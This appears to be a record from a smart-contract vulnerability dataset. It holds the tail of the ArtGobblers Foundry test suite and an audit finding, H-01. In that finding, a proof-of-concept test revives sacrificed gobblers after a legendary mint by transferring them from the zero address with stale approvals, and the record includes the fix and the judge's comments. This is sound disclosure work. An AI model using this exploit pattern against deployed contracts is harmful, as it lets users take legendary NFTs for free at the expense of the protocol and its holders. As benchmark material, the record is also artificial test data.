burned to mint another legendary.\n    function testCannotMintLegendaryWithLegendary() public {\n        vm.warp(block.timestamp + 30 days);\n\n        mintNextLegendary(users[0]);\n        uint256 mintedLegendaryId = gobblers.FIRST_LEGENDARY_GOBBLER_ID();\n        //First legendary to be minted should be 9991\n        assertEq(mintedLegendaryId, 9991);\n        uint256 cost = gobblers.legendaryGobblerPrice();\n\n        // Starting price should be 69.\n        assertEq(cost, 69);\n        setRandomnessAndReveal(cost, \"seed\");\n        for (uint256 i = 1; i <= cost; i++) ids.push(i);\n\n        ids[0] = mintedLegendaryId; // Try to pass in the legendary we just minted as well.\n        vm.prank(users[0]);\n        vm.expectRevert(abi.encodeWithSelector(ArtGobblers.CannotBurnLegendary.selector, mintedLegendaryId));\n        gobblers.mintLegendaryGobbler(ids);\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                                  URIS\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Test unminted URI is correct.\n    function testUnmintedUri() public {\n        hevm.expectRevert(\"NOT_MINTED\");\n        gobblers.tokenURI(1);\n    }\n\n    /// @notice Test that unrevealed URI is correct.\n    function testUnrevealedUri() public {\n        uint256 gobblerCost = gobblers.gobblerPrice();\n        vm.prank(address(gobblers));\n        goo.mintForGobblers(users[0], gobblerCost);\n        vm.prank(users[0]);\n        gobblers.mintFromGoo(type(uint256).max, false);\n        // assert gobbler not revealed after mint\n        assertTrue(stringEquals(gobblers.tokenURI(1), gobblers.UNREVEALED_URI()));\n    }\n\n    /// @notice Test that revealed URI is correct.\n    function testRevealedUri() public {\n        mintGobblerToAddress(users[0], 1);\n        // unrevealed gobblers have 0 value attributes\n        assertEq(gobblers.getGobblerEmissionMultiple(1), 0);\n        vm.warp(block.timestamp + 1 days);\n        setRandomnessAndReveal(1, \"seed\");\n        (, uint64 expectedIndex, ) = gobblers.getGobblerData(1);\n        string memory expectedURI = string(abi.encodePacked(gobblers.BASE_URI(), uint256(expectedIndex).toString()));\n        assertTrue(stringEquals(gobblers.tokenURI(1), expectedURI));\n    }\n\n    /// @notice Test that legendary gobbler URI is correct.\n    function testMintedLegendaryURI() public {\n        //mint legendary for free\n        mintGobblerToAddress(users[0], gobblers.LEGENDARY_AUCTION_INTERVAL() * 2);\n        uint256 currentLegendaryId = gobblers.mintLegendaryGobbler(ids);\n\n        //expected URI should not be shuffled\n        string memory expectedURI = string(\n            abi.encodePacked(gobblers.BASE_URI(), uint256(currentLegendaryId).toString())\n        );\n        string memory actualURI = gobblers.tokenURI(currentLegendaryId);\n        assertTrue(stringEquals(actualURI, expectedURI));\n    }\n\n    /// @notice Test that un-minted legendary gobbler URI is correct.\n    function testUnmintedLegendaryUri() public {\n        uint256 currentLegendaryId = gobblers.FIRST_LEGENDARY_GOBBLER_ID();\n\n        hevm.expectRevert(\"NOT_MINTED\");\n        gobblers.tokenURI(currentLegendaryId);\n\n        hevm.expectRevert(\"NOT_MINTED\");\n        gobblers.tokenURI(currentLegendaryId + 1);\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                                 REVEALS\n    //////////////////////////////////////////////////////////////*/\n\n    function testDoesNotAllowRevealingZero() public {\n        vm.warp(block.timestamp + 24 hours);\n        vm.expectRevert(ArtGobblers.ZeroToBeRevealed.selector);\n        gobblers.requestRandomSeed();\n    }\n\n    /// @notice Cannot request random seed before 24 hours have passed from initial mint.\n    function testRevealDelayInitialMint() public {\n        mintGobblerToAddress(users[0], 1);\n        vm.expectRevert(ArtGobblers.RequestTooEarly.selector);\n        gobblers.requestRandomSeed();\n    }\n\n    /// @notice Cannot reveal more gobblers than remaining to be revealed.\n    function testCannotRevealMoreGobblersThanRemainingToBeRevealed() public {\n        mintGobblerToAddress(users[0], 1);\n\n        vm.warp(block.timestamp + 24 hours);\n\n        bytes32 requestId = gobblers.requestRandomSeed();\n        uint256 randomness = uint256(keccak256(abi.encodePacked(\"seed\")));\n        vrfCoordinator.callBackWithRandomness(requestId, randomness, address(randProvider));\n\n        mintGobblerToAddress(users[0], 2);\n\n        vm.expectRevert(abi.encodeWithSelector(ArtGobblers.NotEnoughRemainingToBeRevealed.selector, 1));\n        gobblers.revealGobblers(2);\n    }\n\n    /// @notice Cannot request random seed before 24 hours have passed from last reveal,\n    function testRevealDelayRecurring() public {\n        // Mint and reveal first gobbler\n        mintGobblerToAddress(users[0], 1);\n        vm.warp(block.timestamp + 1 days);\n        setRandomnessAndReveal(1, \"seed\");\n        // Attempt reveal before 24 hours have passed\n        mintGobblerToAddress(users[0], 1);\n        vm.expectRevert(ArtGobblers.RequestTooEarly.selector);\n        gobblers.requestRandomSeed();\n    }\n\n    /// @notice Test that seed can't be set without first revealing pending gobblers.\n    function testCantSetRandomSeedWithoutRevealing() public {\n        mintGobblerToAddress(users[0], 2);\n        vm.warp(block.timestamp + 1 days);\n        setRandomnessAndReveal(1, \"seed\");\n        vm.warp(block.timestamp + 1 days);\n        // should fail since there is one remaining gobbler to be revealed with seed\n        vm.expectRevert(ArtGobblers.RevealsPending.selector);\n        setRandomnessAndReveal(1, \"seed\");\n    }\n\n    /// @notice Test that revevals work as expected\n    function testMultiReveal() public {\n        mintGobblerToAddress(users[0], 100);\n        // first 100 gobblers should be unrevealed\n        for (uint256 i = 1; i <= 100; i++) {\n            assertEq(gobblers.tokenURI(i), gobblers.UNREVEALED_URI());\n        }\n\n        vm.warp(block.timestamp + 1 days); // can only reveal every 24 hours\n\n        setRandomnessAndReveal(50, \"seed\");\n        // first 50 gobblers should now be revealed\n        for (uint256 i = 1; i <= 50; i++) {\n            assertTrue(!stringEquals(gobblers.tokenURI(i), gobblers.UNREVEALED_URI()));\n        }\n        // and next 50 should remain unrevealed\n        for (uint256 i = 51; i <= 100; i++) {\n            assertTrue(stringEquals(gobblers.tokenURI(i), gobblers.UNREVEALED_URI()));\n        }\n    }\n\n    function testCannotReuseSeedForReveal() public {\n        // first mint and reveal.\n        mintGobblerToAddress(users[0], 1);\n        vm.warp(block.timestamp + 1 days);\n        setRandomnessAndReveal(1, \"seed\");\n        // seed used for first reveal.\n        (uint64 firstSeed, , , , ) = gobblers.gobblerRevealsData();\n        // second mint.\n        mintGobblerToAddress(users[0], 1);\n        vm.warp(block.timestamp + 1 days);\n        gobblers.requestRandomSeed();\n        // seed we want to use for second reveal.\n        (uint64 secondSeed, , , , ) = gobblers.gobblerRevealsData();\n        // verify that we are trying to use the same seed.\n        assertEq(firstSeed, secondSeed);\n        // try to reveal with same seed, which should fail.\n        vm.expectRevert(ArtGobblers.SeedPending.selector);\n        gobblers.revealGobblers(1);\n        assertTrue(true);\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                                  GOO\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice test that goo balance grows as expected.\n    function testSimpleRewards() public {\n        mintGobblerToAddress(users[0], 1);\n        // balance should initially be zero\n        assertEq(gobblers.gooBalance(users[0]), 0);\n        vm.warp(block.timestamp + 100000);\n        // balance should be zero while no reveal\n        assertEq(gobblers.gooBalance(users[0]), 0);\n        setRandomnessAndReveal(1, \"seed\");\n        // balance should NOT grow on same timestamp after reveal\n        assertEq(gobblers.gooBalance(users[0]), 0);\n        vm.warp(block.timestamp + 100000);\n        // balance should grow after reveal\n        assertGt(gobblers.gooBalance(users[0]), 0);\n    }\n\n    /// @notice Test that goo removal works as expected.\n    function testGooRemoval() public {\n        mintGobblerToAddress(users[0], 1);\n        vm.warp(block.timestamp + 1 days);\n        setRandomnessAndReveal(1, \"seed\");\n        vm.warp(block.timestamp + 100000);\n        uint256 initialBalance = gobblers.gooBalance(users[0]);\n        uint256 removalAmount = initialBalance / 10; //10%\n        vm.prank(users[0]);\n        gobblers.removeGoo(removalAmount);\n        uint256 finalBalance = gobblers.gooBalance(users[0]);\n        // balance should change\n        assertTrue(initialBalance != finalBalance);\n        assertEq(initialBalance, finalBalance + removalAmount);\n        // user should have removed goo\n        assertEq(goo.balanceOf(users[0]), removalAmount);\n    }\n\n    /// @notice Test that goo can't be removed when the balance is insufficient.\n    function testCantRemoveGoo() public {\n        vm.warp(block.timestamp + 100000);\n        mintGobblerToAddress(users[0], 1);\n        setRandomnessAndReveal(1, \"seed\");\n        vm.prank(users[0]);\n        vm.expectRevert(stdError.arithmeticError);\n        // can't remove, since balance should be zero.\n        gobblers.removeGoo(1);\n    }\n\n    /// @notice Test that adding goo is reflected in balance.\n    function testGooAddition() public {\n        mintGobblerToAddress(users[0], 1);\n        assertEq(gobblers.getGobblerEmissionMultiple(1), 0);\n        assertEq(gobblers.getUserEmissionMultiple(users[0]), 0);\n        // waiting after mint to reveal shouldn't affect balance\n        vm.warp(block.timestamp + 100000);\n        assertEq(gobblers.gooBalance(users[0]), 0);\n        setRandomnessAndReveal(1, \"seed\");\n        uint256 gobblerMultiple = gobblers.getGobblerEmissionMultiple(1);\n        assertGt(gobblerMultiple, 0);\n        assertEq(gobblers.getUserEmissionMultiple(users[0]), gobblerMultiple);\n        vm.prank(address(gobblers));\n        uint256 additionAmount = 1000;\n        goo.mintForGobblers(users[0], additionAmount);\n        vm.prank(users[0]);\n        gobblers.addGoo(additionAmount);\n        assertEq(gobblers.gooBalance(users[0]), additionAmount);\n    }\n\n    /// @notice Test that we can't add goo when we don't have the corresponding ERC20 balance.\n    function testCantAddMoreGooThanOwned() public {\n        mintGobblerToAddress(users[0], 1);\n        vm.warp(block.timestamp + 1 days);\n        setRandomnessAndReveal(1, \"seed\");\n        vm.prank(users[0]);\n        vm.expectRevert(stdError.arithmeticError);\n        gobblers.addGoo(10000);\n    }\n\n    /// @notice make sure that actions that trigger balance snapshotting do not affect total balance.\n    function testSnapshotDoesNotAffectBalance() public {\n        //mint one gobbler for each user\n        mintGobblerToAddress(users[0], 1);\n        mintGobblerToAddress(users[1], 1);\n        vm.warp(block.timestamp + 1 days);\n        //give user initial goo balance\n        vm.prank(address(gobblers));\n        goo.mintForGobblers(users[0], 100);\n        //reveal gobblers\n        bytes32 requestId = gobblers.requestRandomSeed();\n        uint256 randomness = 1022; // magic seed to ensure both gobblers have same multiplier\n        vrfCoordinator.callBackWithRandomness(requestId, randomness, address(randProvider));\n        gobblers.revealGobblers(2);\n        //make sure both gobblers have same multiple, and same starting balance\n        assertGt(gobblers.getUserEmissionMultiple(users[0]), 0);\n        assertEq(gobblers.getUserEmissionMultiple(users[0]), gobblers.getUserEmissionMultiple(users[1]));\n        uint256 initialBalanceZero = gobblers.gooBalance(users[0]);\n        uint256 initialBalanceOne = gobblers.gooBalance(users[1]);\n        assertEq(initialBalanceZero, initialBalanceOne);\n        vm.warp(block.timestamp + 5 days);\n        //Add and remove one unit of goo to trigger snapshot\n        vm.startPrank(users[0]);\n        gobblers.addGoo(1);\n        gobblers.removeGoo(1);\n        vm.stopPrank();\n        //One more time\n        vm.warp(block.timestamp + 5 days);\n        vm.startPrank(users[0]);\n        gobblers.addGoo(1);\n        gobblers.removeGoo(1);\n        vm.stopPrank();\n        // make sure users have equal balance\n        vm.warp(block.timestamp + 5 days);\n        assertGt(gobblers.getUserEmissionMultiple(users[0]), initialBalanceZero);\n        assertEq(gobblers.gooBalance(users[0]), gobblers.gooBalance(users[1]));\n    }\n\n    /// @notice Test that emission multiple changes as expected after transfer.\n    function testEmissionMultipleUpdatesAfterTransfer() public {\n        mintGobblerToAddress(users[0], 1);\n        vm.warp(block.timestamp + 1 days);\n        setRandomnessAndReveal(1, \"seed\");\n\n        uint256 initialUserMultiple = gobblers.getUserEmissionMultiple(users[0]);\n        assertGt(initialUserMultiple, 0);\n        assertEq(gobblers.getUserEmissionMultiple(users[1]), 0);\n\n        assertEq(gobblers.balanceOf(address(users[0])), 1);\n        assertEq(gobblers.balanceOf(address(users[1])), 0);\n\n        vm.prank(users[0]);\n        gobblers.transferFrom(users[0], users[1], 1);\n\n        assertEq(gobblers.getUserEmissionMultiple(users[0]), 0);\n        assertEq(gobblers.getUserEmissionMultiple(users[1]), initialUserMultiple);\n\n        assertEq(gobblers.balanceOf(address(users[0])), 0);\n        assertEq(gobblers.balanceOf(address(users[1])), 1);\n    }\n\n    /// @notice Test that gobbler balances are accurate after transfer.\n    function testGobblerBalancesAfterTransfer() public {\n        mintGobblerToAddress(users[0], 1);\n        vm.warp(block.timestamp + 1 days);\n        setRandomnessAndReveal(1, \"seed\");\n\n        vm.warp(block.timestamp + 1000000);\n\n        uint256 userOneBalance = gobblers.gooBalance(users[0]);\n        uint256 userTwoBalance = gobblers.gooBalance(users[1]);\n        //user with gobbler should have non-zero balance\n        assertGt(userOneBalance, 0);\n        //other user should have zero balance\n        assertEq(userTwoBalance, 0);\n        //transfer gobblers\n        vm.prank(users[0]);\n        gobblers.transferFrom(users[0], users[1], 1);\n        //balance should not change after transfer\n        assertEq(gobblers.gooBalance(users[0]), userOneBalance);\n        assertEq(gobblers.gooBalance(users[1]), userTwoBalance);\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                               FEEDING ART\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Test that pages can be fed to gobblers.\n    function testFeedingArt() public {\n        address user = users[0];\n        mintGobblerToAddress(user, 1);\n        uint256 pagePrice = pages.pagePrice();\n        vm.prank(address(gobblers));\n        goo.mintForGobblers(user, pagePrice);\n        vm.startPrank(user);\n        pages.mintFromGoo(type(uint256).max, false);\n        gobblers.gobble(1, address(pages), 1, false);\n        vm.stopPrank();\n        assertEq(gobblers.getCopiesOfArtGobbledByGobbler(1, address(pages), 1), 1);\n    }\n\n    /// @notice Test that you can't feed art to gobblers you don't own.\n    function testCantgobbleToUnownedGobbler() public {\n        address user = users[0];\n        uint256 pagePrice = pages.pagePrice();\n        vm.prank(address(gobblers));\n        goo.mintForGobblers(user, pagePrice);\n        vm.startPrank(user);\n        pages.mintFromGoo(type(uint256).max, false);\n        vm.expectRevert(abi.encodeWithSelector(ArtGobblers.OwnerMismatch.selector, address(0)));\n        gobblers.gobble(1, address(pages), 1, false);\n        vm.stopPrank();\n    }\n\n    /// @notice Test that you can't feed art you don't own to your gobbler.\n    function testCantFeedUnownedArt() public {\n        address user = users[0];\n        mintGobblerToAddress(user, 1);\n        vm.startPrank(user);\n        vm.expectRevert(\"WRONG_FROM\");\n        gobblers.gobble(1, address(pages), 1, false);\n        vm.stopPrank();\n    }\n\n    /// @notice Test that gobblers can't eat other gobblers\n    function testCantFeedGobblers() public {\n        address user = users[0];\n        mintGobblerToAddress(user, 2);\n        vm.startPrank(user);\n        vm.expectRevert(ArtGobblers.Cannibalism.selector);\n        gobblers.gobble(1, address(gobblers), 2, true);\n        vm.stopPrank();\n    }\n\n    function testCantFeed721As1155() public {\n        address user = users[0];\n        mintGobblerToAddress(user, 1);\n        uint256 pagePrice = pages.pagePrice();\n        vm.prank(address(gobblers));\n        goo.mintForGobblers(user, pagePrice);\n        vm.startPrank(user);\n        pages.mintFromGoo(type(uint256).max, false);\n        vm.expectRevert();\n        gobblers.gobble(1, address(pages), 1, true);\n    }\n\n    function testFeeding1155() public {\n        address user = users[0];\n        mintGobblerToAddress(user, 1);\n        MockERC1155 token = new MockERC1155();\n        token.mint(user, 0, 1, \"\");\n        vm.startPrank(user);\n        token.setApprovalForAll(address(gobblers), true);\n        gobblers.gobble(1, address(token), 0, true);\n        vm.stopPrank();\n        assertEq(gobblers.getCopiesOfArtGobbledByGobbler(1, address(token), 0), 1);\n    }\n\n    function testFeedingMultiple1155Copies() public {\n        address user = users[0];\n        mintGobblerToAddress(user, 1);\n        MockERC1155 token = new MockERC1155();\n        token.mint(user, 0, 5, \"\");\n        vm.startPrank(user);\n        token.setApprovalForAll(address(gobblers), true);\n        gobblers.gobble(1, address(token), 0, true);\n        gobblers.gobble(1, address(token), 0, true);\n        gobblers.gobble(1, address(token), 0, true);\n        gobblers.gobble(1, address(token), 0, true);\n        gobblers.gobble(1, address(token), 0, true);\n        vm.stopPrank();\n        assertEq(gobblers.getCopiesOfArtGobbledByGobbler(1, address(token), 0), 5);\n    }\n\n    function testCantFeed1155As721() public {\n        address user = users[0];\n        mintGobblerToAddress(user, 1);\n        MockERC1155 token = new MockERC1155();\n        token.mint(user, 0, 1, \"\");\n        vm.startPrank(user);\n        token.setApprovalForAll(address(gobblers), true);\n        vm.expectRevert();\n        gobblers.gobble(1, address(token), 0, false);\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                           LONG-RUNNING TESTS\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Check that max supply is mintable\n    function testLongRunningMintMaxFromGoo() public {\n        uint256 maxMintableWithGoo = gobblers.MAX_MINTABLE();\n\n        for (uint256 i = 0; i < maxMintableWithGoo; i++) {\n            vm.warp(block.timestamp + 1 days);\n            uint256 cost = gobblers.gobblerPrice();\n            vm.prank(address(gobblers));\n            goo.mintForGobblers(users[0], cost);\n            vm.prank(users[0]);\n            gobblers.mintFromGoo(type(uint256).max, false);\n        }\n    }\n\n    /// @notice Check that minting beyond max supply should revert.\n    function testLongRunningMintMaxFromGooRevert() public {\n        uint256 maxMintableWithGoo = gobblers.MAX_MINTABLE();\n\n        for (uint256 i = 0; i < maxMintableWithGoo + 1; i++) {\n            vm.warp(block.timestamp + 1 days);\n\n            if (i == maxMintableWithGoo) vm.expectRevert(\"UNDEFINED\");\n            uint256 cost = gobblers.gobblerPrice();\n\n            vm.prank(address(gobblers));\n            goo.mintForGobblers(users[0], cost);\n            vm.prank(users[0]);\n\n            if (i == maxMintableWithGoo) vm.expectRevert(\"UNDEFINED\");\n            gobblers.mintFromGoo(type(uint256).max, false);\n        }\n    }\n\n    /// @notice Check that max reserved supplies are mintable.\n    function testLongRunningMintMaxReserved() public {\n        uint256 maxMintableWithGoo = gobblers.MAX_MINTABLE();\n\n        for (uint256 i = 0; i < maxMintableWithGoo; i++) {\n            vm.warp(block.timestamp + 1 days);\n            uint256 cost = gobblers.gobblerPrice();\n            vm.prank(address(gobblers));\n            goo.mintForGobblers(users[0], cost);\n            vm.prank(users[0]);\n            gobblers.mintFromGoo(type(uint256).max, false);\n        }\n\n        gobblers.mintReservedGobblers(gobblers.RESERVED_SUPPLY() / 2);\n    }\n\n    /// @notice Check that minting reserves beyond their max supply reverts.\n    function testLongRunningMintMaxTeamRevert() public {\n        uint256 maxMintableWithGoo = gobblers.MAX_MINTABLE();\n\n        for (uint256 i = 0; i < maxMintableWithGoo; i++) {\n            vm.warp(block.timestamp + 1 days);\n            uint256 cost = gobblers.gobblerPrice();\n            vm.prank(address(gobblers));\n            goo.mintForGobblers(users[0], cost);\n            vm.prank(users[0]);\n            gobblers.mintFromGoo(type(uint256).max, false);\n        }\n\n        gobblers.mintReservedGobblers(gobblers.RESERVED_SUPPLY() / 2);\n\n        vm.expectRevert(ArtGobblers.ReserveImbalance.selector);\n        gobblers.mintReservedGobblers(1);\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                                 HELPERS\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Mint a number of gobblers to the given address\n    function mintGobblerToAddress(address addr, uint256 num) internal {\n        for (uint256 i = 0; i < num; i++) {\n            vm.startPrank(address(gobblers));\n            goo.mintForGobblers(addr, gobblers.gobblerPrice());\n            vm.stopPrank();\n\n            uint256 gobblersOwnedBefore = gobblers.balanceOf(addr);\n\n            vm.prank(addr);\n            gobblers.mintFromGoo(type(uint256).max, false);\n\n            assertEq(gobblers.balanceOf(addr), gobblersOwnedBefore + 1);\n        }\n    }\n\n    /// @notice Call back vrf with randomness and reveal gobblers.\n    function setRandomnessAndReveal(uint256 numReveal, string memory seed) internal {\n        bytes32 requestId = gobblers.requestRandomSeed();\n        uint256 randomness = uint256(keccak256(abi.encodePacked(seed)));\n        // call back from coordinator\n        vrfCoordinator.callBackWithRandomness(requestId, randomness, address(randProvider));\n        gobblers.revealGobblers(numReveal);\n    }\n\n    /// @notice Check for string equality.\n    function stringEquals(string memory s1, string memory s2) internal pure returns (bool) {\n        return keccak256(abi.encodePacked(s1)) == keccak256(abi.encodePacked(s2));\n    }\n\n    function mintNextLegendary(address addr) internal {\n        uint256[] memory id;\n        mintGobblerToAddress(addr, gobblers.LEGENDARY_AUCTION_INTERVAL() * 2);\n        vm.prank(addr);\n        gobblers.mintLegendaryGobbler(id);\n    }\n}\n\n\n",
        "CodeNames": [
            "ArtGobblers.sol",
            "ArtGobblers.t.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-01",
                "Location": [
                    "//solidity\nfunction testCanReuseSacrificedGobblers() public {\n\taddress user = users[0];\n\n\t// setup legendary mint\n\tuint256 startTime = block.timestamp + 30 days;\n\tvm.warp(startTime);\n\tmintGobblerToAddress(user, gobblers.LEGENDARY_AUCTION_INTERVAL());\n\tuint256 cost = gobblers.legendaryGobblerPrice();\n\tassertEq(cost, 69);\n\tsetRandomnessAndReveal(cost, \"seed\");\n\n\tfor (uint256 curId = 1; curId <= cost; curId++) {\n\t\tids.push(curId);\n\t\tassertEq(gobblers.ownerOf(curId), users[0]);\n\t}\n\n\t// do token approvals for vulnerability exploit\n\tvm.startPrank(user);\n\tfor (uint256 i = 0; i < ids.length; i++) {\n\t\tgobblers.approve(user, ids[i]);\n\t}\n\tvm.stopPrank();\n\n\t// mint legendary\n\tvm.prank(user);\n\tuint256 mintedLegendaryId = gobblers.mintLegendaryGobbler(ids);\n\n\t// confirm user owns legendary\n\tassertEq(gobblers.ownerOf(mintedLegendaryId), user);\n\n\t// show that contract initially thinks tokens are burnt\n\tfor (uint256 i = 0; i < ids.length; i++) {\n\t\thevm.expectRevert(\"NOT_MINTED\");\n\t\tgobblers.ownerOf(ids[i]);\n\t}\n\n\t// \"revive\" burnt tokens by transferring from zero address with approval\n\t// which was not reset\n\tvm.startPrank(user);\n\tfor (uint256 i = 0; i < ids.length; i++) {\n\t\tgobblers.transferFrom(address(0), user, ids[i]);\n\t\tassertEq(gobblers.ownerOf(ids[i]), user);\n\t}\n\tvm.stopPrank();\n}\n"
                ],
                "Type": " Can Recover Gobblers Burnt In Legendary Mint",
                "Description": "*Submitted by philogy, also found by auditor0517, bin2chen, cccz, hansfriese, hyh, KIntern_NA, ladboy233, m9800, pauliax, pedroais, ronnyx2017, wagmi, wastewa, and zzykxx*\n\nArtGobblers.sol#L432(https://github.com/code-423n4/2022-09-artgobblers/blob/d2087c5a8a6a4f1b9784520e7fe75afa3a9cbdbe/src/ArtGobblers.sol#L432)<br\nArtGobblers.sol#L890(https://github.com/code-423n4/2022-09-artgobblers/blob/d2087c5a8a6a4f1b9784520e7fe75afa3a9cbdbe/src/ArtGobblers.sol#L890)<br\n\nAllows users to mint legendary Gobblers for free assuming they have the necessary amount of Gobblers to begin with. This is achieved by \"reviving\" sacrificed Gobblers after having called mintLegendaryGobbler.\n\n\nThis vulnerability allows the violation of the fundamental mechanics of in-scope contracts, allowing buyers to purchase legendary Gobblers at almost no cost outside of temporary liquidity requirements which can be reduced via the use of NFT flashloans.\n\n\nAdd the following code to the ArtGobblersTest contract in  test/ArtGobblers.t.sol  and run the test via forge test --match-test testCanReuseSacrificedGobblers  -vvv:\n\nsolidity\nfunction testCanReuseSacrificedGobblers() public {\n\taddress user = users[0];\n\n\t// setup legendary mint\n\tuint256 startTime = block.timestamp + 30 days;\n\tvm.warp(startTime);\n\tmintGobblerToAddress(user, gobblers.LEGENDARY_AUCTION_INTERVAL());\n\tuint256 cost = gobblers.legendaryGobblerPrice();\n\tassertEq(cost, 69);\n\tsetRandomnessAndReveal(cost, \"seed\");\n\n\tfor (uint256 curId = 1; curId <= cost; curId++) {\n\t\tids.push(curId);\n\t\tassertEq(gobblers.ownerOf(curId), users[0]);\n\t}\n\n\t// do token approvals for vulnerability exploit\n\tvm.startPrank(user);\n\tfor (uint256 i = 0; i < ids.length; i++) {\n\t\tgobblers.approve(user, ids[i]);\n\t}\n\tvm.stopPrank();\n\n\t// mint legendary\n\tvm.prank(user);\n\tuint256 mintedLegendaryId = gobblers.mintLegendaryGobbler(ids);\n\n\t// confirm user owns legendary\n\tassertEq(gobblers.ownerOf(mintedLegendaryId), user);\n\n\t// show that contract initially thinks tokens are burnt\n\tfor (uint256 i = 0; i < ids.length; i++) {\n\t\thevm.expectRevert(\"NOT_MINTED\");\n\t\tgobblers.ownerOf(ids[i]);\n\t}\n\n\t// \"revive\" burnt tokens by transferring from zero address with approval\n\t// which was not reset\n\tvm.startPrank(user);\n\tfor (uint256 i = 0; i < ids.length; i++) {\n\t\tgobblers.transferFrom(address(0), user, ids[i]);\n\t\tassertEq(gobblers.ownerOf(ids[i]), user);\n\t}\n\tvm.stopPrank();\n}\n\n\n",
                "Repair": "\nEnsure token ownership is reset in the for-loop of the mintLegendaryGobbler method. Alternatively to reduce the gas cost of mintLegendaryGobbler by saving on the approval deletion, simply check the from address in transferFrom, revert if it's address(0). Note that the latter version would also require changing the getApproved view method such that it checks the owner of the token and returns the zero-address if the owner is zero, otherwise the getApproved method would return the old owner after the underlying Gobbler was sacrificed.\n\nFrankieIsLost (Art Gobblers) confirmed and commented(https://github.com/code-423n4/2022-09-artgobblers-findings/issues/219#issuecomment-1268956379):\n  Great find. Agree with severity. Here is the fix: https://github.com/artgobblers/art-gobblers/pull/151 \n\nAlex the Entreprenerd (judge) commented(https://github.com/code-423n4/2022-09-artgobblers-findings/issues/219#issuecomment-1272417972):\n  The Warden has shown how, because the approvals field was not cleared, an owner could \"bring back a Gobbler from the dead\", allowing them to mint legendary Gobblers for free.\n \n The sponsor has mitigated the issue by clearing the getApproved field.\n \n Because this finding breaks protocol invariants, and would allow to sidestep the cost to mint a Legendary Gobbler, I agree with High Severity.\n\n\n\n*\n \n\n"
            }
        ]
    }
]